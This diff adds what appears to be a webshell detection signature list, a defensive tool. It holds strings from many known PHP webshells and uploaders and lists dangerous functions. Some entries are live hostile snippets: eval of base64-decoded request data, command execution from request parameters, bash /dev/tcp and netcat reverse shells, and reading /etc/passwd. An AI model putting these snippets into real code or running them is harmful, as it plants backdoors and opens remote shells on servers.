@@ -1,0 +1,695 @@
+name="command" placeholder="Command"
+<pre align=center><form method=post>Password<br>
+type='file'
+#!/usr/bin/perl   -I/usr/local/bandmin
+#!/usr/bin/perl -I/usr/local/bandmin
+#0x1877
+#0x2525
+#No_Identity
+#block-css#
+#content_loading#
+#p@@#
+#p@@# 
+#wp_config_error#
+$password = "MF6SXb5sds5";
+${"_POST"}['cmd']();
+${${"_REQUEST"}['_']}();
+%PDF-0-1<form action
+&mode=upload'>Upload file</a></td>
+&nbsp;Backdoor Destroyer
+* Leaf PHP Mailer by [orvx.pw]
+- FierzaXploit -
+- Leaf PHPMailer</title>
+-r--r--r--
+-rw-r--r--
+-rw-r--r-- 
+-rw-rw-r--
+-rwxr-xr-x
+-rwxrwxrwx
+./AlfaTeam
+.well-known/pki-validation/wp-signup
+.wp-cache
+//0x5a455553.github.io/MARIJUANA/icon.png
+0byt3m1n1
+0byt3m1n1 Shell
+0byte
+0byte v2 Shell
+200400
+403WebShell
+403WebShell 
+404-server!!
+768776e296b6f286f2a72607e276b62666c6d286
+;unlink(__FILE__);?>
+<!-- End Matomo Code -->
+<a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a> 
+<a href="https://github.com/Den1xxx/Filemanager"> 
+<a href=\"?\"><img src=\"https://github.com/fluidicon.png\" width=\"30\" height=\"30\" alt=\"\"></a>
+<a href=\"https://github.com/Den1xxx/Filemanager\">
+<ahref="/wp-includes/IXR/class-IXR-base64.php">
+<body>%PDF-0-1<
+<br/>Security Code: <br/><input name=\"security_code\" value=\"\"/>
+<button>Gaskan</button>
+<div class="corner text-secondary">shell bypass 403</div>
+<div class=\"corner text-secondary\">shell bypass 403</div>
+<div id=\"snackbar\"></div>
+<div><h5>DSH v0.1</h5>
+<font color="green"><center> Up :
+<font color="red"><center> Shell
+<form action="" method="post"
+<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">
+<form enctype=\"multipart/form-data\" method=\"POST\">
+<form enctype=\"multipart/form-data\" method=\"post\">
+<form id = \"file_uploader\" name = \"file_uploader\" target=\"_blank\"
+<form method="post" target="_self" enctype="multipart/form-data">
+<h1>Ghost Exploiter Team Official</h1>
+<h1>Mad Tools Shell</h1>
+<h1>[ Shin Bypassed ]</h1>
+<h1>{ INDOSEC }</h1>
+<h2>Your IP :
+<html><head><title>Login</title></head><body><form action="" method="POST">
+<html><head><title>Login</title></head><body><form action=\"\" method=\"POST\">
+<imgclass="icon"src="/_autoindex/assets/icons/
+<input id=\"submit\" type=\"submit\" name=\"submit\" value=\"Upload me!\">
+<input name="_upl" type="submit" id="_upl" value="Upload"></form>
+<input name="ext" type="text" value=".php"/>'
+<input name='postpass' type='password'
+<input name=\"ext\" type=\"text\" value=\".php\"/>
+<input name=\"uploadedfile\" type=\"file\"/>
+<input name=postpass type=password
+<input type="file" name="apx"
+<input type="file" name="file" size="50">
+<input type="file" name="fileToUpload" id="fileToUpload"
+<input type="file" size="20" name="file_jpg" /> <input type="submit" value="upload" />
+<input type="file" size="20" name="uploads" />
+<input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />
+<input type="password" name="pwd" title="Password" autofocus>
+<input type="submit" name="mkdir" value="Make directory">
+<input type="submit" value="ddok"/>
+<input type="submit" value="ok">
+<input type="submit" value="upload" />  </form>
+<input type='submit' value='Submit'
+<input type=\"file\" id=\"upload_files\" name=\"upload_files\" multiple=\"multiple\">
+<input type=\"file\" name=\"apx\"
+<input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"
+<input type=\"file\" name=\"mbdfiles\"/>
+<input type=\"file\" name=\"uploaded_file\"></input>
+<input type=\"file\" name=\"upoleuid\"/><input type=\"submit\" value=\"ddok\"/></form>
+<input type=\"file\" size=\"20\" name=\"file_jpg\" /> <input type=\"submit\" value=\"upload\" />
+<input type=\"file\" size=\"20\" name=\"uploads\" /> <input type=\"submit\" value=\"upload\" />
+<input type=\"password\" name=\"pwd\" title=\"Password\" autofocus>
+<input type=\"submit\" name=\"mkdir\" value=\"Make directory\">
+<input type=\"submit\" value=\"-----\">
+<input type=\"submit\" value=\"ok\">
+<input type=\"text\" name=\"target\" size=\"100\" value=\"Location where file will be uploaded (include file name!)\"
+<input type=file name=f><input name=k type=submit id=k value=upload>
+<input type=hidden name=p1 value=
+<input type=password name='xxx'>
+<input type=password name=pass
+<input type=submit name='watching'
+<input type=text name=cmd value=
+<option value="/tmp/">
+<pre align=center><form method=post>Password<br><input type=password name=pass
+<small>Copyright © 2021 - Haxor Clan</small>
+<span>Upload file:</span
+<title>#CLS-LEAK#</title>
+<title>#shwty</title>
+<title>#shwty</title> 
+<title>./LahBodoAmat Uploader shells</title>
+<title>000</title>
+<title>DRUNK SHELL BETA </title>
+<title>FierzaXploit</title>
+<title>File manager</title>
+<title>Fuxxer</title>
+<title>Fuxxer</title> 
+<title>Get S.H.E.L.L.en v1.0
+<title>Get S.H.E.L.L.en v1.0 | BY ..</title>
+<title>IndoXploit</title>
+<title>Leaf PHPMailer</title>
+<title>Legion</title>
+<title>MATTEKUDASAI</title>
+<title>Mini Shell</title>
+<title>PhpShells.Com</title>
+<title>Qu?n lý File</title>
+<title>Qu?n lý File</title> 
+<title>R@DIK@L</title>
+<title>RansomWeb BlackCoders XploiterCrew</title>
+<title>Simple File Manage Design by index.php</title>
+<title>Simple File Manage Design by index.php</title> 
+<title>Simple Shell</title>
+<title>Simple Shell</title> 
+<title>Tiny File Manager</title>
+<title>UPLOADER KCT-OFFICIAL</title>
+<title>Upload files...</title>
+<title>Vuln!! patch it Now!</title>
+<title>WIBUHAX0R1337 - ShelL</title>
+<title>alexusMailer 2.0</title>
+<title>dfsfkjltyerg</title>
+<title>kaylin
+<title>xLeet PHPMailer</title>
+<title>||TINY SHELL ||</title>
+<title>请勿使用非法用途</title>
+=== bbPress ===
+>Cassano Bypass <
+>File manager<
+>Lock Shell</a></li>
+>Password<br><input
+>Shell Command<
+>Upload file:
+????JFIF??x?x????
+@assert($_GET['cmd']);
+@assert($_POST['x']);
+@eval($_REQUEST['cmd']);
+ABC Manager
+ABC Manager 
+ALFA TEaM Shell
+ALFA TEaM Shell - v3.0.2
+ALFA TEaM Shell - v4.1-Tesla
+ALFA TEaM Shell - v4.1-Tesla 
+Ajout nouvelle actualité
+AlkantarClanX12
+Alpha
+Andela1C3
+AnonymousFox
+B Ge Team File Manager
+Backdoor Destroyer 
+Black Bot
+BlackDragon
+Bypass 403 Forbidden / 406 Not Acceptable / Imunify360 / Mini Shell
+Bypass Sh3ll
+C0d3d By Dr.D3m0
+CCAEF Uploader
+CHips L Pro sangad
+Change Permissions
+Choose a file to upload: <input name=\"uploadedfile\" type=\"file\" />
+Cod3d By AnonymousFox
+Cod3d By aDriv4
+Code By Kelelawar Cyber Team
+Copyright negat1ve1337
+Cpanel Reset Password
+Current dir:
+Current directory:
+D3xterR00t
+DeathShop Uploader
+Doc Root:
+Dr HeX
+Drive Uploader
+Enjoy it </h1><html><head><title>Upload files...<
+F0x
+F4st~03 Bypass 403
+FierzaXploit {Mini Shell }
+Fighter Kamrul Plugin
+File manager
+File manager -
+File mu mas : <input name=\"file\" type=\"file\"
+FileManager Version 0.2 by ECWS
+FilesMAn
+FilesMan
+FoxCyberSecurity
+FoxWSO
+FoxWSO v1.2
+Franz Private Shell
+Function putenv()
+Gel4y Mini Shell
+Gelişmiş Dosya Yöneticisi
+Graybyt3 Was Here
+Graybyt3 Was Here 
+H3NING_MAL4M
+H3X
+Haxgeno7"
+Html404
+Hunter Neel
+Hunter Neel 
+IndoXploit
+Indramayu Cyber
+JEMBOETS
+Jijle3
+KCT MINI SHELL 403
+King RxR Was
+L I E R SHELL
+Lambo [Beta]
+Leafmail3
+Leviathan Hunter
+LinuXploit
+Local file: <input type =
+MARIJuANA
+MINI MO Shell
+MSQ_403
+Madstore.sk!
+Marijuana
+MarukoChan Priv8
+Mini Shell
+Mini Shell By Black_Shadow
+Minishell
+Mister Spy
+MisterSpyv7up
+Modified By #No_Identity
+Mr.Anderson
+Mr.Combet WebShell
+Mr.Combet Webshell
+Negat1ve Shell
+Negat1ve Shell 
+Ninja Shell
+Notice: Do not delete or modify the CERT-FILE
+NullBrain
+Nyanpasu!!!
+One Hat Cyber Team
+PHP File Manager
+PHP File Manager 
+PHP Uploader
+PHP Uploader - By Phenix-TN & Mr.Anderson
+PHP-SHELL HUNTER
+PHPSESSID
+PHU Mini Shell
+Phenix-TN
+Powered By Indonesian Darknet
+Pr1v8 Upl0ader
+Priv8 Home Root Uploader
+Priv8 Home Root Uploader by Mrcakil
+Priv8 Sh3ll!
+Priv8 Uploader
+Priv8 WebShell
+Psych0.WorM
+Public Shell Version 2.0
+RC-SHELL v2.0.2011.1009
+Raiz0WorM
+RevoLutioN Namesis
+RxR
+RxR HaCkEr
+RxRHaCkEr
+SEA-GHOST MINSHELL
+SIMPEL BANGET NIH SHELL
+SOQOR Shell By : HACKERS PAL
+Send Message
+SeoOk
+Sh3ll
+Sh3ll By Anons79
+Shal Shell Kontol:V
+Shell Bypass 403 GE-C666C
+Shell Uploader
+Simple File Manage Design by index.php
+Simple,Responsive & Powerfull
+SuramSh3ll
+TEAM-0ROOT
+TEAM-0ROOT Uploader
+TheAlmightyZeus
+Tiny File Manager 2.4.3
+TripleDNN
+Tryag
+Tryag File Manager
+U7TiM4T3_H4x0R Plugin
+Uname :
+Uname:
+United Bangladeshi Hackers
+United Tunsian Scammers
+UnknownSec
+UnknownSec Shell
+Upl04d3r
+Upl0od Your T0ols
+Upload File :
+Upload File : <input type="file" name="file" />
+Upload File : <input type=\"file\" name=\"file\" />
+Upload File : <input type=\"file\" name=\"file\" /> 'type="password" name="pwdyt"
+Upload File: <input type="file" name="file"\' type="button">
+Upload File: <input type=\"file\" name=\"file\"' type=\"button\">
+Upload File<
+Upload file :
+Upload:</b> <input type=\"file\" id=\"upload\" name=\"upload\"
+Upload</a> ]</li><li>[
+Uploader RxR HaCkEr
+Vuln!! patch it Now!
+Vuln!! patch it Now! 
+WHY MINI SHELL
+WIBUHAX0R1337
+WSO
+WSO 2.5
+WSO 2.6
+WSO 4.2.5
+WSO 4.2.6
+WSO 5.0.0
+WSO 5.1.4
+WSO YANZ ENC BYPASS
+WSOX ENC
+WSOX ENC 
+Walkers404 Xh3ll B4ckd00r
+Web Console
+WebRooT
+WebShellOrb
+WebShellOrb 2.6
+Webshell
+Webshell V1.0
+Windows-1251
+X-Sec Shell V.3
+X-Sec Shell V.3 
+X0MB13
+X4Exploit
+X7-ROOT
+X_Shell
+Yanz Webshell!
+Yanz Webshell! - PRIV8 WEB SHELL ORB YANZ BYPASS!
+Yohohohohohooho
+[ ! ] Cilent Shell Backdor [ ! ]
+[ Avaa Bypassed ]
+[ HOME SHELL ]
+[ HOME SHELL ] 
+[ HOME ]
+[ Mini Shell ]
+[+[MAD TIGER]+]
+[+] MINI SH3LL BYPASS [+]
+[LAMBO]
+[UNAME]:
+\" name=\"command\" placeholder=\"Command\"
+\"<pre align=center><form method=post>Password<br>
+a57bze8931
+aDriv4
+aDriv4 Uploader
+aDriv4-Priv8 TOOL
+admin403
+admin404
+adriv4
+alfa
+alfa-v4
+alfa123
+alpha
+anons79
+anonymousfox
+apache_get_modules
+array_map(
+assert($_POST['cmd']);
+assert($_REQUEST['cmd']);
+assert()
+assert(base64_decode
+assert(base64_decode(
+assert(base64_decode($_POST['code']));
+assert(base64_decode($_REQUEST['x']));
+assert(gzinflate(base64_decode($_POST['payload'])));
+b374k
+b374k 2.8
+b374k&nbsp;<span class=
+base64_decode
+base64_encode
+blacksec
+bondowoso black hat shell
+bypass
+byps
+c99
+call_user_func($_POST['func'], $_POST['param']);
+chmod(
+chown
+chr
+class=\"Input\" type=\"file\" name=\"file_n[]\"
+con7
+con7ext
+config
+config root man
+cong
+cot
+create_function
+create_function('', $_POST['cmd']);
+curl
+disable_functions
+docindex
+dragonforce
+drwxr-x---
+drwxr-xr-x
+drwxr-xr-x 
+drwxrwxr-x
+eval($_POST['cmd']);
+eval()
+eval(base64_decode
+eval(base64_decode($_POST['code']));
+eval(gzdecode(base64_decode($_POST['x'])));
+eval(gzinflate(base64_decode($_POST['payload'])));
+eval(gzuncompress(base64_decode($_POST['data'])));
+eval(gzuncompress(base64_decode($_POST['x'])));
+eval(htmlspecialchars_decode(
+eval(str_rot13(base64_decode($_POST['data'])));
+eval(strrev($_POST['cmd']));
+evil
+eviltwin
+exec
+exec("/bin/bash -c 'bash -i >& /dev/tcp/".$_POST['ip']."/".$_POST['port']." 0>&1'");
+exec("bash -i >& /dev/tcp/".$_POST['ip']."/".$_POST['port']." 0>&1");
+exec("id");
+exec("ls -la");
+exec("php -r 'system($_GET[\"cmd\"]);'");
+exec("python -c 'import pty; pty.spawn(\"/bin/bash\")'");
+exec("wget ".$_GET['url']." -O ".$_GET['save']);
+exec($_
+exec($_GET['cmd']);
+fclose
+feof
+fgetc
+fgets
+fierza
+file_get_contents
+file_put_contents
+filemanager
+for="senderEmail"
+form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"
+form method=POST enctype=\"multipart/form-data\" action=\"\"><input type=text name=path><input type=\"file\" name=\"files\"><input type=submit value=\"Up\"
+form method=\"post\"
+form method=\"post\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"__\"><input name=\"_\" type=\"submit\" value=\"Upload\"
+form method=post>Password: <input type=password name=pass><input type=submit value=
+fox
+foxwso
+foxx
+fread
+function
+gecko
+gel4y
+gelay
+ghostsec
+god4m
+gzdecode
+gzinflate
+gzuncompress
+gzuncompress(base64_decode
+haxor
+highlight_file
+http://www.ubhteam.org/images/UBHFinal1.png
+https://github.com/fluidicon.png
+hunter
+iCloud1337 private shell
+include
+include_once
+includes
+indosec
+indoxploit
+ineSec Team Shell
+ini PHP Upload By Haxgeno7
+input type="file"
+input type="file" id="inputfile" name="inputfile" 
+input type="file" name="__"><input name="_" type="submit" value="Upload"
+input type="file" name="__"><input name="_" type="submit" value="Upload" 
+input type="file" name="file"><input name="_upl" type="submit"
+input type="submit" name="linknya" class="up" value="Upload
+input type="submit" value=">>"
+input type="submit" value="Upload Image" name="submit"
+input type="submit" value="Upload Image" name="submit"'-rwxr-xr-x
+input type="text" readonly="1" id="upload_visible" 
+input type='submit' name='upload' value='upload
+input type=\"file\"
+input type=\"file\" id=\"inputfile\" name=\"inputfile\"
+input type=\"file\" name=\"__\"><input name=\"_\" type=\"submit\" value=\"Upload\"
+input type=\"file\" name=\"a\"&gt;&lt;input name=\"x\" type=\"submit\" value=\"x\""
+input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"
+input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"
+input type=\"file\" name=\"file\"><input name=\"_upl\" type=\"submit\"
+input type=\"file\" name=\"gecko-file\" id=\"\"><input type=\"submit\" class=\"upload-submit\" name=\"upload-submit\" value=\"Upload\"
+input type=\"file\" name=\"upload\"
+input type=\"hidden\" name=\"pilihan\" value=\"upload\"
+input type=\"submit\" name=\"linknya\" class=\"up\" value=\"Upload
+input type=\"submit\" name=\"submit\" value=\"  >>\"
+input type=\"submit\" name=\"submit\" value=\"  >>\"'Leaf PHPMailer</title>
+input type=\"submit\" name=\"submit\" value=\"Upload\"
+input type=\"submit\" value=\"Upload Image\" name=\"submit\"
+input type=\"submit\" value=\"Upload\" name=\"gecko-up-submit\"
+input type=\"text\" readonly=\"1\" id=\"upload_visible\"
+input type=\"text\" size=\"40\" id=\"fetch_path\" name=\"fetch_path\" value=\"\"
+input type=\"text\" size=\"4\" id=\"fetch_port\" name=\"fetch_port\" value=\"80\"
+input type=password name=pass><input type=submit value='>>'>
+input type=text name=path><input type="file" name="files"><input type=submit value="Up"
+input type=text name=path><input type=\"file\" name=\"files\"><input type=submit value=\"Up\"
+is_readable
+is_writable
+izocin
+j3mb03dz m4w0tz sh311
+jadow
+jindex
+js?get
+kct
+kct403
+kill_the_net
+kliverz1337
+litespeed
+load
+local
+lock360
+lol
+m1n1 5h3ll
+m1n1 Shell
+mari
+marijuana
+mb_send_mail
+min
+mini
+minipriv
+minishell
+move_uploaded_file
+move_uploaded_file(
+mrjn
+name="_upl" type="submit" id="_upl" value="Upload
+name="subject"
+name="uploader" id="uploader"
+name="uploader" id="uploader">
+name="uploader" id="uploader"><input type="file" name="file"><input name="_upl" type="submit" id="_upl"<Upl file</a></td>'
+name='watching
+name=\"uploader\" id=\"uploader\"
+name=\"uploader\" id=\"uploader\"><input type=\"file\" name=\"file\"><input name=\"_upl\" type=\"submit\" id=\"_upl\"<Upl file</a></td>
+nc
+ncat
+netcat
+new-index
+ninja
+nopebee7 [@] skullxploit
+okokok
+old-index
+omest403
+open_basedir
+opendir
+ord
+p0wny@shell:~#
+pack
+parse_ini_file
+passthru
+passthru($
+passthru($_REQUEST['cmd']);
+payload
+pcntl_exec
+phpMyAdmin
+phpinfo()
+phpinfo?re@=vo@
+pload</a><li><a>Sym
+popen
+popen($_GET['cmd'], 'r');
+pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value=
+pref
+preg_replace
+preg_replace_callback
+priv
+priv8
+priv8 mini shell
+private shell
+proc_close
+proc_get_status
+proc_open
+proc_open("/bin/sh", [0=>['pipe','r'], 1=>['pipe','w']], $pipes);
+proc_open($_POST['cmd'], [1=>['pipe','w']], $pipes);
+proc_terminate
+ps7n4K3CBK
+pwd
+qindex
+r00t
+radio?pass=shell
+rawurldecode
+require_once
+root
+root:root
+root@indoxploit
+scandir
+shell
+shell bypass 403
+shell20211028
+shell_exec
+shell_exec(
+shell_exec("cat /etc/passwd");
+shell_exec("nc -e /bin/sh ".$_POST['ip']." ".$_POST['port']);
+shell_exec($_POST['cmd']);
+shellbypass
+shells
+shl
+show_source
+shx
+size="50"><input name="_upl"
+socket_accept
+socket_bind
+socket_connect
+socket_create
+socket_listen
+socket_read
+socket_write
+str_rot13
+str_rot13(base64_decode
+stream_socket_client
+stream_socket_server
+strrev
+sunda
+sundaxploit
+sym403
+symlink
+symlink403
+sys
+system
+system("curl -O ".$_POST['url']);
+system("perl -e 'exec \"/bin/sh\";'");
+system("uname -a");
+system($
+system($_GET['cmd']);
+testwp?wp=1
+tinyfilemanager
+title>Smoker Backdoor</title>
+title>V4Mp</title
+tonant
+touch
+trenggalek6etar
+type= "file"
+type="file"/><input type="submit"
+type="file"/><input type="submit" value="doit"/></form>  
+type="file"><input type="submit" value="Upload"
+type="submit" id="_upl" value="
+type="submit" value="upload"
+type=\"button\">Upload File<
+type=\"file\"/><input type=\"submit\" value=\"doit\"/></form>
+type=\"file\"><input type=\"submit\" value=\"Upload\"
+type=\"password\" name=\"pwdyt\"
+type=\'file\'
+ubhteam
+uk45
+un2?f=f
+uname -a
+unknown
+unlink
+unlink(__FILE__);?>
+unpack
+unserialize
+upload
+uploader
+value="goodit"/>
+value=\"Make directory\"
+var u="https://okklink.top/";
+vuln
+vulncode
+walex says Fuck Off Kids:
+wp-wso
+wp_wrong_datlib
+wpindex
+wsanon
+wso
+wso2
+wso403
+wsopriv
+x3x3x3x_5h3ll
+x7root
+xAttacker
+xXx Kelelawar Cyber Team xXx
+xdmah
+xforce
+xichang1
+xleet
+xleet-shell
+xleetshell
+yanz
+{Ninja-Shell}
+| PHP 7.4.20 |
+| PHP 7.4.27 |
+©TheAlmightyZeus
